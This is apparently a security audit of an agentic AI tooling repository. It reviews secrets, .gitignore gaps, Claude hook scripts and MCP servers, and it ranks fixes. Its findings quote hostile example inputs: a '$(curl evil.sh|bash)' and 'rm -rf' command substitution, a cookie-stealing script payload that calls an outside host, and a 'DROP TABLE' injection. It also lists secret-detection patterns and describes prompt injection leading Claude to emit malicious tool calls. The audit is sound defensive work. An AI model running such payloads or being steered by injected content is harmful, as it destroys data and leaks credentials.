# Security + Hygiene Audit — agentic-creator-os

**Scope:** Public MIT repo at `C:\Users\frank\starlight\repos\agentic-creator-os`. Working tree HEAD `2044b37` (single-commit history). 1,705 tracked files.

**Verdict:** No exposed secrets. Several real hygiene problems (broken hook deps, tracked binary SQLite databases, tracked `build/` artifacts, useless `pnpm-lock.yaml`). Two genuine — but limited-scope — security concerns: shell-substitution risk in `.claude/settings.json` hooks, and unrestricted SQL in the database MCP `query` tool.

---

## 1. Secrets in working tree

**Result: clean.** All scan patterns returned zero real matches.

| Pattern | Matches |
|---|---|
| `sk-[A-Za-z0-9_-]{20,}` (Anthropic/OpenAI live) | 0 |
| `pk_live_…`, `ghp_…`, `xoxb-…`, `AKIA[0-9A-Z]{16}` | 0 |
| JWT `eyJ…\.…\.…` | 0 |
| `-----BEGIN … PRIVATE KEY-----` | 0 |
| Hard-coded `password=`, `api_key=`, `token=` literals | 0 (only dummy values, see below) |

Non-matches that look like matches but are safe:
- `.claude/skills/gstack/.env.example:5` — `ANTHROPIC_API_KEY=sk-a...` (clearly a placeholder, file is `.env.example`)
- `.claude/agents/testing/{validation/,}production-validator.md:144` — `apiKey: 'inva...'` (negative-test fixture)
- `.claude/agents/sparc/refinement.md:62,90` — `password: 'Secu...'` / `'Wron...'` (login-test fixtures)
- `.claude/skills/gstack/browse/test/cookie-import-browser.test.ts:25` — `TEST_PASSWORD = 'test...'` (keychain test fixture)

No tracked files match `*.env`, `*.pem`, `*.key`, `*.p12`, `*.pfx`, `*.crt`, or names containing `secret|credential|password|private`.

## 2. Secrets in git history

**Result: clean.** History is a single commit (`git rev-list --all --count` → 1). Full-history regex scan (`git log -p --all` piped through the secret patterns above) returned zero hits. There is no prior history that could leak a now-redacted secret.

## 3. .gitignore gaps

`.gitignore` covers the basics (`node_modules/`, `.env*`, `dist/`, `build/`, `coverage/`, `tmp/`, `.claude-flow/`). Real gaps:

1. **`build/` is gitignored but already tracked** under every MCP server (`mcp-servers/*/build/index.js`, `.d.ts`, `.js.map`, `.d.ts.map`). The ignore is silently inert because the files were committed before. Either un-track them (`git rm -r --cached mcp-servers/*/build`) or add them to `files` whitelist intentionally — currently they ship in npm via the `files` array in `package.json` AND get rebuilt by `install.sh`, so shipping the prebuilt artifacts is partly redundant and an integrity risk if the source ever drifts from `build/`.
2. **SQLite databases not ignored.** `.claude/memory.db` (155,648 bytes) and `.swarm/memory.db` (identical size, same mtime) are tracked. Both currently contain only an empty schema + a `metadata` table with `schema_version`/`backend` rows — no user data — but the file *type* should not be in version control. Add `*.db`, `*.sqlite`, `*.sqlite3` to `.gitignore` and `git rm --cached .claude/memory.db .swarm/memory.db`.
3. **`pnpm-lock.yaml`** is untracked but exists in the working tree (114 bytes, lockfileVersion 9.0, `.: {}` — i.e., zero resolved deps). Either commit a real lockfile or delete the stub. Currently it does nothing useful.
4. **No `.intake/` rule.** The audit directory you're writing into is untracked but not ignored — fine for now; add `.intake/` to `.gitignore` if these reports should never land on GitHub.
5. **`private/`, `credentials/`, `secrets/` not pre-emptively ignored.** Low priority for a public-by-design repo, but cheap insurance.

## 4. Script / hook safety review

### `install.sh` (495 lines, MIT-published installer)

- Uses `set -e`, quotes most paths. `--sync` mode runs `git pull --rebase origin main` from `$PROJECT_DIR` — fine, no `curl | bash` patterns.
- Heredoc at L208–225 builds `state.json` with `$VERSION` and `$timestamp` from `date -u +…` — both are hard-coded or shell-generated, no user input. Safe.
- The MCP-build step (L375) does `cd "$server_dir" && npm install --quiet … && npm run build --quiet …` per server — no validation that `package.json` `scripts.build` is the expected one. If a malicious PR ships an evil `scripts.build`, installer runs it. Acceptable for an installer that the user opted into.

### `build-servers.sh` (55 lines)

Simple wrapper around `npm run install:all` / `npm run build:all`. No injection vectors.

### `bin/acos-sync.sh` + `bin/acos-enhance`

- `acos-sync.sh` does `curl -fsSL "$GITHUB_RAW/skills/$category/$skill_name/CLAUDE.md"` where `$skill_name` is a positional arg — but `$skill_name` is never validated/sanitized before URL interpolation. A user invoking `acos-sync install '../../malicious'` could pivot the path. Low risk (user supplies own input), but path traversal in URL is a code smell.
- `acos-enhance` does `git clone --depth 1 "$url" "$cache_dir"` where `$url` comes from a hard-coded `SOURCES` associative array (lines 24–30). Safe.

### `.claude/hooks/self-modify-gate.sh`

Lines 134–144 interpolate `'''$file'''` into a python3 heredoc:

```bash
python3 -c "
import json, datetime
meta = {
    'id': '$snap_id',
    'file': '''$file''',
    ...
}
"
```

If `$file` contains a triple-quote `'''` followed by Python, you get Python-code injection. `$file` comes from the caller, which is wired to hook-driven file paths. Real exploit would need an attacker-controlled file path passed into the hook. Low practical risk, but the right fix is `python3 - <<'PYEOF'` (single-quoted heredoc) and pass `$file` via env var.

### `.claude/settings.json` hooks — REAL FINDING

Hooks interpolate user/agent-controlled vars into a single shell command string:

```json
"command": "[ -n \"$TOOL_INPUT_command\" ] && npx @claude-flow/cli@latest hooks pre-command --command \"$TOOL_INPUT_command\" 2>/dev/null || true"
```

Inside double quotes, bash still expands `$(…)` and backticks. If Claude generates a Bash tool call whose `command` value contains `"; echo $(rm -rf ~/scratch); echo "` (or simply `$(curl evil.sh|bash)`), the hook subshell will evaluate the command substitution before `claude-flow` ever sees it. Same pattern repeats for:

- `PreToolUse/Write|Edit|MultiEdit` → `$TOOL_INPUT_file_path`
- `PreToolUse/Task` → `$TOOL_INPUT_prompt`
- `PostToolUse/Bash` → `$TOOL_INPUT_command`
- `UserPromptSubmit` → `$PROMPT`  (most exposed — direct user text)
- `Notification` → `$NOTIFICATION_MESSAGE`

Severity: medium. The hook subshell already runs with the user's privileges. Claude itself is the "attacker," but an adversarial doc/URL could prompt-inject Claude into emitting a malicious tool input. Mitigation: switch to env-var passing, e.g.

```json
"command": "TOOL_INPUT_COMMAND=\"$TOOL_INPUT_command\" .claude/hooks/run-pre-command.sh"
```

…and have the wrapper use `"$TOOL_INPUT_COMMAND"` literally (no re-interpolation in `npx … --command "$TOOL_INPUT_COMMAND"`).

### Broken hook scripts (hygiene)

Five hooks `require('../lib/utils')` or `require('../lib/resolve-formatter')`, but `hooks/lib/` does not exist in the repo:

- `hooks/quality-gate.js`
- `hooks/suggest-compact.js`
- `hooks/pre-compact.js`
- `hooks/cost-tracker.js`
- `hooks/evaluate-session.js`

These will crash on first run. Either restore the `lib/` directory or remove the hooks. Not a security issue, but they ship broken.

### `hooks/mcp-health-check.js:433` — `spawnSync(command, { shell: true })`

`command` is built from `process.env.ECC_MCP_RECONNECT_*` with `{server}` substitution. `serverName` comes from MCP config keys. If a malicious MCP config (already a trusted input) sets a server name `foo; rm -rf ~`, it lands inside `shell: true`. Trust boundary is fine (user controls their own `.mcp.json`), but `shell: true` should be removed and `command` parsed/split.

## 5. MCP server safety

### `mcp-servers/filesystem`

Path validation via `validatePath()` resolves `realpath` and checks against `allowedDirectories` — proper symlink-escape protection. **Default-allowed dir is `process.cwd()`** if `FILESYSTEM_ALLOWED_DIRS` env is unset (L218). That means anyone wiring the MCP without setting the env gets full read/write/delete on the working tree. Document this in the README, or fail closed if env is unset.

### `mcp-servers/database`

Two tools accept arbitrary SQL strings (L86 `query`, L115 `execute`). The `query` tool is annotated `readOnlyHint: true` but **does not enforce read-only**. An LLM/prompt-injector calling `query` with `DROP TABLE …; --` will succeed. Either (a) parse the SQL and reject non-SELECT, (b) open a separate read-only DB handle for `query`, or (c) drop the hint to remove false safety signal. SQLite is local file (`file:acos.db`), so blast radius is contained to the local database, not catastrophic — but the misleading annotation is the real bug.

### `mcp-servers/browser`

`evaluate` tool (L195–222) runs arbitrary user JS in the page context via `page.evaluate(script)`, annotated `readOnlyHint: true` (wrong — JS can mutate DOM, exfiltrate cookies). Same false annotation issue as above.

### `mcp-servers/email`

`send_template_email` (L117–123) substitutes template `data` values into HTML without escaping — if a user passes `name = "<script>fetch('http://x/?c='+document.cookie)</script>"`, that goes into the outbound HTML. Most mail clients sanitize, but don't rely on that. Escape with a real HTML escaper. Same issue in `send_welcome_email` (L162–163).

SMTP creds via env (`SMTP_USER`/`SMTP_PASS`) — correct.

### `mcp-servers/creator/src/social/notion.ts`

`NOTION_API_KEY` from env. Throws if unset. Clean.

## 6. Untracked `pnpm-lock.yaml` — decision

**Don't commit it as-is.** Current contents:

```yaml
lockfileVersion: '9.0'
settings:
  autoInstallPeers: true
  excludeLinksFromLockfile: false
importers:
  .: {}
```

Zero resolved deps — it's the output of `pnpm install` against a root `package.json` with **no `dependencies` / `devDependencies`** (root `package.json` only declares `workspaces`). The MCP server workspaces each have their own deps but `pnpm` wasn't run for them.

Three options:
- **Delete it** (preferred): repo uses `npm` per `.gitignore` (`package-lock.json` is excluded — though that's also wrong if CI runs `npm ci`), per `install.sh` (calls `npm install`), and per `ci.yml` (calls `npm ci`). The pnpm file is noise.
- **Keep but ignore**: add `pnpm-lock.yaml` to `.gitignore` if you anticipate switching to pnpm.
- **Adopt pnpm properly**: run `pnpm -r install`, then commit a real lockfile and switch `install.sh` + CI to pnpm. This contradicts Frank's stated default (`pnpm` is your preferred manager globally) but the current repo is configured for `npm` — pick one.

Nothing sensitive in the current file.

CI side note: `.github/workflows/ci.yml` runs `npm ci`, which **requires `package-lock.json`**, which is gitignored — CI cannot currently succeed. Either un-ignore the lockfile or change to `npm install`.

## 7. Dependency posture

Root `package.json` declares zero runtime deps. All deps live in `mcp-servers/*/package.json`:

| Package | Used by | Version constraint | Notes |
|---|---|---|---|
| `@modelcontextprotocol/sdk` | all 7 servers | `^1.0.0` | floats to current; OK |
| `zod` | all 7 servers | `^3.22.0` | floats; ✓ |
| `playwright` | browser | `^1.40.0` | older constraint, current is 1.50+. Update. |
| `@libsql/client` | database | `^0.14.0` | current |
| `nodemailer` | email | `^6.9.0` | check for advisories (nodemailer 7 released 2024) — currently fine |
| `esbuild` | creator (dev), evaluator (dev) | `^0.27.2`, `^0.19.0` | evaluator is on the old esbuild line; bump |
| `typescript` | all (dev) | `^5.0.0` | OK |

No pinned versions, no `overrides` block, no audit script. Add `"scripts": { "audit": "npm audit --audit-level=high" }` and run in CI.

No node_modules tracked.

## 8. Ranked remediation actions

1. **Fix `.claude/settings.json` hook shell-injection vector.** Move all `$TOOL_INPUT_*` / `$PROMPT` / `$NOTIFICATION_MESSAGE` interpolation out of the inline JSON `command` strings into env-var-only wrapper scripts under `.claude/hooks/`. Highest-impact change.
2. **Un-track `.claude/memory.db` and `.swarm/memory.db`** and add `*.db` to `.gitignore`. Even though current contents are empty, you don't want next session's vector embeddings or memory entries silently ending up in a public MIT repo.
3. **Fix database MCP `query` tool to actually be read-only** (separate connection or SQL allowlist), or remove `readOnlyHint: true`. Same fix for browser MCP `evaluate`.
4. **Fix CI**: `npm ci` cannot run without a tracked lockfile. Either commit `package-lock.json` (remove the gitignore rule) or switch CI to `npm install`. Currently the green-badge CI cannot succeed on a fresh clone.
5. **Delete or properly populate `pnpm-lock.yaml`.** Currently a useless stub.
6. **Restore `hooks/lib/utils.js` and `hooks/lib/resolve-formatter.js`** or delete the 5 hook scripts that depend on them. Shipping broken hooks degrades trust.
7. **Document `FILESYSTEM_ALLOWED_DIRS` requirement** in the filesystem MCP README, and fail closed when unset instead of defaulting to `process.cwd()`.
8. **HTML-escape template variables** in `mcp-servers/email/src/index.ts` (`send_template_email`, `send_welcome_email`, `send_notification`).
9. **Un-track `mcp-servers/*/build/`** if you intend to rely on `install.sh` / `npm run build:all` for end users. Otherwise document that shipped artifacts are authoritative and `build/` is in `files` array.
10. **Tighten `self-modify-gate.sh` python heredoc** (use `<<'PYEOF'` + env-var passing).
11. **Remove `shell: true`** from `hooks/mcp-health-check.js` reconnect path.
12. **Add `.intake/`, `private/`, `secrets/`, `credentials/`, `*.db`, `*.sqlite*` to `.gitignore`** as pre-emptive insurance.
13. **Bump `playwright` and the old `esbuild ^0.19`** constraints. Add `npm audit` to CI.

Word count: ~1,750.
